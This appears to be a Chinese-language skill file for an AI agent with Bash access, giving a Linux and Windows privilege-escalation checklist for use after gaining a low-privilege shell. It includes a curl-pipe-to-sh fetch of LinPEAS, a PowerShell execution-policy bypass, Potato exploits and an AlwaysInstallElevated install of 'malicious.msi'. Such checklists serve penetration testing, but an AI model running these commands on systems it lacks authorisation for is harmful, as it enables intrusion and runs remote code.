---
name: privesc
description: Linux/Windows 权限提升方法论
when_to_use: 当获得低权限 shell 需要提权时
allowed-tools: [Bash, Read, Write]
argument-hint: "<linux|windows>"
arguments: [os]
user-invocable: true
context: inline
---

## 权限提升

### Linux 提权

#### 自动化工具

```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

#### 手动检查

```bash
# SUID 文件
find / -perm -4000 -type f 2>/dev/null

# sudo 权限
sudo -l

# 可写文件
find / -writable -type f 2>/dev/null | grep -v proc

# cron 任务
cat /etc/crontab
ls -la /etc/cron.*

# 内核版本
uname -a
cat /etc/os-release
```

#### 常见提权路径

```
sudo -l 有结果
  ├── GTFOBins 查询对应命令
  ├── env_keep 利用 LD_PRELOAD
  └── NOPASSWD 直接利用

SUID 文件
  ├── GTFOBins 查询
  ├── 自定义二进制 → 逆向分析
  └── 共享库劫持

Cron 任务
  ├── 可写脚本 → 注入命令
  ├── 通配符注入
  └── PATH 劫持
```

### Windows 提权

#### 自动化工具

```bash
# WinPEAS
.\winPEASany.exe

# PowerUp
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

# Seatbelt
.\Seatbelt.exe -group=all
```

#### 手动检查

```bash
# 当前权限
whoami /priv
whoami /groups

# 系统信息
systeminfo

# 服务权限
sc query state= all
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# 计划任务
schtasks /query /fo LIST /v
```

#### 常见提权路径

```
SeImpersonatePrivilege
  └── Potato 系列 (JuicyPotato, PrintSpoofer, GodPotato)

服务配置错误
  ├── 未引用路径
  ├── 弱权限服务
  └── DLL 劫持

AlwaysInstallElevated
  └── msiexec /quiet /qn /i malicious.msi
```
